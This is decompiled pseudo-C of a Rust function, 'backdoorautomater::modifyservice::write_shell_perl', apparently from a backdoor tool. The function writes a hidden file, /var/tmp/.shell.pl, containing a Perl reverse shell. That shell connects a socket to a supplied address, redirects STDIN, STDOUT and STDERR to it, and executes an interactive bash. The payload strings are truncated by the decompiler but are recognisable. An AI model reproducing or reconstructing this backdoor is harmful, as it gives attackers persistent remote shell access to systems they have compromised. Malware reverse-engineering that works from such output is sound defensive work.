
  char const (**)[0x94] backdoorautomater::modifyservice::write_shell_perl::h8eb642524aa8e285(int64_t* arg1, int64_t* arg2)

{
    int32_t var_88;
    std::fs::File::create::hf69a1aea5d21dd7b(&var_88, "/var/tmp/.shell.pluse Socket;\n$…");
    char const (** result)[0x94];
    
    if (!var_88)
    {
        int32_t fd_1;
        int32_t fd = fd_1;
        char const (** result_2)[0x94] = std::io::Write::write_all::h18f2f3ca7c9bcc20(&fd, 
            "use Socket;\n$p=socket(S,PF_INET…", 0xc);
        result = result_2;
        
        if (result_2)
        {
            core::ptr::drop_in_place$LT$std..fs..File$GT$::hb99078073e1bf56b(fd);
            core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(arg2);
        }
        else
        {
            var_88 = "$i='kindNoneSomeZeroIpv4Ipv6info…";
            int64_t var_80 = 4;
            int128_t var_78_1 = *(arg2 + 8);
            int128_t var_30;
            alloc::str::join_generic_copy::hc78a65dc4338aaa9(&var_30, &var_88, 2, 1, 0);
            int128_t var_68 = var_30;
            alloc::vec::Vec$LT$T$C$A$GT$::extend_from_slice::h3cce9f7974121c70(&var_68, 
                "';\n));\n$i='kindNoneSomeZeroIpv…", 3);
            uint64_t var_20;
            char const (** result_3)[0x94] =
                std::io::Write::write_all::h18f2f3ca7c9bcc20(&fd, *var_68[8], var_20);
            result = result_3;
            
            if (result_3)
                goto label_4559e5;
            
            var_88 = "$p=socket(S,PF_INET,SOCK_STREAM,…";
            int64_t var_80_1 = 3;
            int128_t var_78_2 = *(arg1 + 8);
            alloc::str::join_generic_copy::hc78a65dc4338aaa9(&var_30, &var_88, 2, 1, 0);
            int128_t var_48 = var_30;
            alloc::vec::Vec$LT$T$C$A$GT$::extend_from_slice::h3cce9f7974121c70(&var_48, 
                ";\n/var/tmp/.shell.pluse Socket;…", 2);
            char const (** result_4)[0x94] =
                std::io::Write::write_all::h18f2f3ca7c9bcc20(&fd, *var_48[8], var_20);
            result = result_4;
            
            if (result_4)
            {
                label_4559db:
                core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(&var_48);
                label_4559e5:
                core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(&var_68);
                core::ptr::drop_in_place$LT$std..fs..File$GT$::hb99078073e1bf56b(fd);
                core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(arg2);
            }
            else
            {
                char const (** result_5)[0x94] = std::io::Write::write_all::h18f2f3ca7c9bcc20(&fd, 
                    "socket(S,PF_INET,SOCK_STREAM,get…", 0x35);
                result = result_5;
                
                if (result_5)
                    goto label_4559db;
                
                char const (** result_6)[0x94] = std::io::Write::write_all::h18f2f3ca7c9bcc20(&fd, 
                    "if(connect(S,sockaddr_in($p,inet…", 0x2e);
                result = result_6;
                
                if (result_6)
                    goto label_4559db;
                
                char const (** result_7)[0x94] = std::io::Write::write_all::h18f2f3ca7c9bcc20(&fd, 
                    "open(STDIN,'>&S');\nopen(STDOUT,…", 0x13);
                result = result_7;
                
                if (result_7)
                    goto label_4559db;
                
                char const (** result_8)[0x94] = std::io::Write::write_all::h18f2f3ca7c9bcc20(&fd, 
                    "open(STDOUT,'>&S');\nopen(STDERR…", 0x14);
                result = result_8;
                
                if (result_8)
                    goto label_4559db;
                
                char const (** result_9)[0x94] = std::io::Write::write_all::h18f2f3ca7c9bcc20(&fd, 
                    "open(STDERR,'>&S');\nexec('/usr/…", 0x14);
                result = result_9;
                
                if (result_9)
                    goto label_4559db;
                
                char const (** result_10)[0x94] = std::io::Write::write_all::h18f2f3ca7c9bcc20(&fd, 
                    "exec('/usr/bin/bash -i');\n};\nc…", 0x1a);
                result = result_10;
                
                if (result_10)
                    goto label_4559db;
                
                char const (** result_11)[0x94] =
                    std::io::Write::write_all::h18f2f3ca7c9bcc20(&fd, &data_566081[0x42], 3);
                result = result_11;
                
                if (result_11)
                    goto label_4559db;
                
                core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(&var_48);
                core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(&var_68);
                core::ptr::drop_in_place$LT$std..fs..File$GT$::hb99078073e1bf56b(fd);
                core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(arg2);
                result = nullptr;
            }
        }
    }
    else
    {
        char const (** result_1)[0x94];
        result = result_1;
        core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(arg2);
    }
    
    core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(arg1);
    return result;
}
